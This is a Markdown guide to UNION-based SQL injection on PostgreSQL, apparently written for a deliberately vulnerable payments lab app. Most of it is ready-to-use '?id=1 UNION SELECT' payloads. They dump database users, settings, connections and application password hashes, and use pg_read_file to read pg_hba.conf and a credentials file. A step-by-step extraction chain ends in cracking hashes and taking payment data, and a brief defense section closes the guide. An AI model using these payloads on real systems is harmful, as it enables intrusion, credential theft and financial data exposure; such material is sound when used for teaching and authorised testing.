# 🔐 SQL Injection: Environment & Configuration Extraction

## 🎯 Extracting Database Credentials & Configuration

While **environment variables** from the container aren't directly accessible from PostgreSQL, you can extract valuable database configuration and connection information!

---

## 📊 What You CAN Extract

### 1. Database Connection Information

```sql
-- Get current database, user, and version
?id=1 UNION SELECT 1, 2, current_database(), 0.00, current_user, version(), CURRENT_TIMESTAMP
```

**Returns**:
- Database name: `typo_payments`
- Current user: `typo_admin`
- PostgreSQL version: `PostgreSQL 15.15 on aarch64-unknown-linux-musl`

---

### 2. Database Configuration Settings

```sql
-- Extract data directory and config file locations
?id=1 UNION SELECT 1, 2, 'config', 0.00, CONCAT('data_dir: ', (SELECT setting FROM pg_settings WHERE name='data_directory'), ' | config: ', (SELECT setting FROM pg_settings WHERE name='config_file')), 'settings', CURRENT_TIMESTAMP
```

**Returns**:
- Data directory: `/var/lib/postgresql/data`
- Config file: `/var/lib/postgresql/data/postgresql.conf`
- HBA file: `/var/lib/postgresql/data/pg_hba.conf`

---

### 3. List All Database Users

```sql
-- Get all PostgreSQL users and their privileges
?id=1 UNION SELECT 1, 2, usename, 0.00, CONCAT('superuser: ', usesuper::text, ' | createdb: ', usecreatedb::text, ' | createrole: ', usecreaterole::text), 'user_info', CURRENT_TIMESTAMP FROM pg_user
```

**Returns**: All database users with their privilege levels

---

### 4. Database Connection Information from pg_stat_activity

```sql
-- See active connections (who's connected, from where)
?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('user: ', usename, ' | client: ', client_addr::text, ' | state: ', state), 'connections', CURRENT_TIMESTAMP FROM pg_stat_activity WHERE pid != pg_backend_pid() LIMIT 1
```

**Returns**: Active database connections with client IPs and usernames

---

### 5. Extract Password Hashes from Application

```sql
-- Get user password hashes from application's users table
?id=1 UNION SELECT 1, 2, username, 0.00, CONCAT('email: ', email, ' | hash: ', password_hash), 'credentials', created_at FROM users
```

**Returns**: All application user credentials (password hashes that can be cracked!)

---

## 🔥 High-Value Payloads

### Payload #1: Database Credentials Discovery
```sql
?id=1 UNION SELECT 1, 2, 'DB_INFO', 0.00, CONCAT('Database: ', current_database(), ' | User: ', current_user, ' | Host: ', inet_server_addr()::text, ' | Port: ', inet_server_port()::text), 'creds', CURRENT_TIMESTAMP
```

### Payload #2: Configuration File Paths
```sql
?id=1 UNION SELECT 1, 2, name, 0.00, setting, 'config', CURRENT_TIMESTAMP FROM pg_settings WHERE name IN ('config_file', 'hba_file', 'data_directory', 'log_directory')
```

### Payload #3: All Database Names
```sql
?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('owner: ', (SELECT usename FROM pg_user WHERE usesysid = datdba), ' | encoding: ', pg_encoding_to_char(encoding)), 'databases', CURRENT_TIMESTAMP FROM pg_database
```

### Payload #4: List All Tables (Schema Discovery)
```sql
?id=1 UNION SELECT 1, 2, tablename, 0.00, CONCAT('schema: ', schemaname, ' | owner: ', tableowner), 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname = 'public'
```

### Payload #5: Extract User Credentials
```sql
?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users
```

---

## 🗂️ System Information Extraction

### Get PostgreSQL Version & System Info
```sql
?id=1 UNION SELECT 1, 2, 'version', 0.00, version(), 'system', CURRENT_TIMESTAMP
```

### Get Server Settings
```sql
?id=1 UNION SELECT 1, 2, name, 0.00, setting, category, CURRENT_TIMESTAMP FROM pg_settings WHERE category LIKE '%Connection%' LIMIT 5
```

### Get Database Size
```sql
?id=1 UNION SELECT 1, 2, 'database_size', 0.00, pg_size_pretty(pg_database_size(current_database())), 'metrics', CURRENT_TIMESTAMP
```

---

## 📁 File System Access

### Read Configuration Files
```sql
-- Read postgresql.conf
?id=1 UNION SELECT 1, 2, 'postgresql.conf', 0.00, pg_read_file('/var/lib/postgresql/data/postgresql.conf'), 'config', CURRENT_TIMESTAMP

-- Read pg_hba.conf (authentication config)
?id=1 UNION SELECT 1, 2, 'pg_hba.conf', 0.00, pg_read_file('/var/lib/postgresql/data/pg_hba.conf'), 'auth_config', CURRENT_TIMESTAMP
```

### Read Application Config
```sql
-- Read dbconf.ini (contains credentials!)
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/dbconf.ini'), 'app_config', CURRENT_TIMESTAMP
```

---

## 🎓 Why Environment Variables Aren't Directly Accessible

### The Technical Reason

PostgreSQL runs as a **separate process** from the application:

```
┌─────────────────────────────────────────────┐
│           Docker Container                   │
│                                             │
│  ┌─────────────────┐  ┌──────────────────┐ │
│  │  Flask App      │  │  PostgreSQL      │ │
│  │  (Python)       │  │  (Database)      │ │
│  │                 │  │                  │ │
│  │  ENV vars:      │  │  No access to    │ │
│  │  - DB_PASSWORD  │  │  Flask's ENV     │ │
│  │  - DB_HOST      │  │  variables       │ │
│  │  - API_KEYS     │  │                  │ │
│  └─────────────────┘  └──────────────────┘ │
│                                             │
└─────────────────────────────────────────────┘
```

**Key Point**: PostgreSQL can only see:
- Its own configuration files
- Files it has permission to read
- Data stored in its databases
- Its own process information

**It CANNOT see**:
- Environment variables from other processes (like Flask)
- Application-level secrets
- Container environment variables (unless explicitly set for PostgreSQL)

---

## 💰 What You SHOULD Target Instead

### 1. Application Database Tables ⭐

The most valuable data is in the **application's tables**:

```sql
-- User credentials (hashcat can crack these!)
SELECT username, email, password_hash FROM users;

-- Payment information
SELECT * FROM payments WHERE amount > 1000;

-- Sensitive feedback/messages
SELECT * FROM feedback;
```

### 2. Configuration Files ⭐⭐

Read files that **do** contain secrets:

```sql
-- Application config with API keys, passwords, etc.
pg_read_file('/dbconf.ini')

-- PostgreSQL connection config
pg_read_file('/var/lib/postgresql/data/postgresql.conf')

-- Authentication rules
pg_read_file('/var/lib/postgresql/data/pg_hba.conf')
```

### 3. Database Metadata ⭐

Understand the database structure:

```sql
-- Find all tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- Find all columns in a table
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';

-- Find tables with interesting names
SELECT tablename FROM pg_tables WHERE tablename LIKE '%secret%' OR tablename LIKE '%key%' OR tablename LIKE '%token%';
```

### 4. Active Connections & Sessions

See who else is connected:

```sql
-- Active sessions
SELECT usename, client_addr, state, query FROM pg_stat_activity;
```

---

## 🚀 Complete Extraction Chain

### Step 1: Reconnaissance
```sql
-- Discover database name and user
?id=1 UNION SELECT 1, 2, current_database(), 0.00, current_user, version(), CURRENT_TIMESTAMP
```

### Step 2: Schema Discovery
```sql
-- List all tables
?id=1 UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname='public'
```

### Step 3: Column Discovery
```sql
-- Get columns for 'users' table
?id=1 UNION SELECT 1, 2, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

### Step 4: Data Extraction
```sql
-- Extract all user credentials
?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users
```

### Step 5: Configuration Files
```sql
-- Read application config
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/dbconf.ini'), 'config', CURRENT_TIMESTAMP
```

### Step 6: Profit! 💰

With extracted data:
- **Crack password hashes** → Login as admin
- **Read API keys** → Access external services
- **Understand schema** → Exfiltrate all data
- **Find backup credentials** → Access backup database

---

## 📋 Complete Information Gathering Payload

### One-Shot Database Fingerprint

```sql
?id=1 UNION SELECT 1, 2, 'FINGERPRINT', 0.00, CONCAT(
  'DB: ', current_database(), 
  ' | User: ', current_user,
  ' | Version: ', version(),
  ' | Data Dir: ', (SELECT setting FROM pg_settings WHERE name='data_directory'),
  ' | Config: ', (SELECT setting FROM pg_settings WHERE name='config_file')
), 'info', CURRENT_TIMESTAMP
```

This extracts:
- Database name
- Current user
- PostgreSQL version
- Data directory path
- Config file location

---

## 🛡️ Defense: What Went Wrong

### Vulnerability Stack

1. ❌ **SQL Injection** - Unparameterized queries
2. ❌ **Excessive Privileges** - DB user can read files (`pg_read_file`)
3. ❌ **Plaintext Secrets** - Credentials in config files
4. ❌ **No Input Validation** - User input directly in SQL
5. ❌ **Detailed Errors** - SQL errors shown to users

### How to Fix

```python
# ✅ SECURE: Parameterized queries
query = "SELECT * FROM payments WHERE user_id = %s AND id = %s"
cursor.execute(query, (current_user.id, payment_id))

# ✅ SECURE: Least privilege
# Revoke file reading privileges from application database user
REVOKE pg_read_server_files FROM typo_admin;

# ✅ SECURE: Use secrets manager
import os
db_password = os.environ.get('DB_PASSWORD')  # From environment
# Or use AWS Secrets Manager, HashiCorp Vault, etc.

# ✅ SECURE: Input validation
if not payment_id.isdigit():
    return abort(400, "Invalid payment ID")

# ✅ SECURE: Generic errors
except Exception as e:
    logger.error(f"Database error: {e}")  # Log details
    return abort(500, "An error occurred")  # Show generic message
```

---

## 🎯 Key Takeaways

1. ✅ **Environment variables** from Flask are NOT accessible via PostgreSQL
2. ✅ **Configuration files** (like dbconf.ini) ARE accessible via `pg_read_file()`
3. ✅ **Database tables** contain the most valuable data (credentials, payments)
4. ✅ **pg_settings** table reveals database configuration
5. ✅ **information_schema** reveals database structure
6. ✅ **Multiple tables/queries** can be combined with UNION
7. ✅ **File reading + table extraction** = complete compromise

---

## 📚 Related Documentation

- **POSTGRES_SQLI_PAYLOADS.md** - Complete payload library
- **CONFIG_FILE_ATTACK.md** - Configuration file exploitation
- **QUICK_REFERENCE.md** - Quick start guide
- **TYPE_MATCHING_GUIDE.md** - UNION query type matching

---

## 🔥 Most Valuable Targets (Priority Order)

1. 🥇 **`/dbconf.ini`** - Contains DB passwords, API keys, secrets
2. 🥈 **`users` table** - Password hashes to crack
3. 🥉 **`payments` table** - Financial data
4. 🏅 **`pg_hba.conf`** - Authentication configuration
5. 🏅 **`information_schema`** - Database structure
6. 🏅 **`pg_settings`** - Configuration paths and settings

---

**Remember**: The goal isn't just to get the password - it's to understand the entire system, extract all valuable data, and demonstrate the complete business impact of SQL injection! 💰

---

**Updated**: November 25, 2025  
**Context**: PostgreSQL SQL Injection  
**Goal**: Complete environment & configuration extraction  
**Impact**: 🔥 HIGH - Full database and configuration compromise
